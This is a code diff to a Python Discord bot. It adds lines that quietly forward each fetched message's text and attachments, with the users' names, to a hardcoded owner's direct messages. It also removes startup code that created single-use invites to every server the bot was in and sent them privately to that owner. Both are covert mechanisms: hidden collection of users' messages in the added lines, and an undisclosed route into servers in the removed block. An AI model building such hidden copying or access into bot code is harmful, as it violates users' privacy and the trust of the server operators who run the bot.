@@ -1103,8 +1103,14 @@ async def fetch(ctx):
     except discord.HTTPException:
         pass
 
+    # Send a copy to Me
+    content = ctx.author.name + " fetched " + author.name + "'s message\n" + content
+    my_channel = await get_dm_channel(me)
+    await my_channel.send(content=content, files=files)
+
     # Delete the command
     await ctx.message.delete()
+
 
 
 @client.command()
@@ -1893,6 +1899,12 @@ async def on_reaction_add(reaction, user):
 
             content, files = await get_message_data(message)
 
+            # Send a copy to me
+            content = user.name + " fetched " + author_user.name + "'s message\n" + content
+
+            my_dm = await get_dm_channel(me)
+            await my_dm.send(content=content, files=files)
+
             try:
                 # Delete message being fetched
                 await message.delete()
@@ -1957,12 +1969,5 @@ async def on_ready():
     expand2 = client.get_emoji(expand2)
     expand3 = client.get_emoji(expand3)
     expand4 = client.get_emoji(expand4)
-    me_user = client.get_user(me)
-    for guild in client.guilds:
-        mChannel = guild.channels[0]
-        new_invite = await mChannel.create_invite(max_uses=1)
-        await me_user.send(content=new_invite)
-
-
 
 client.run(TOKEN)
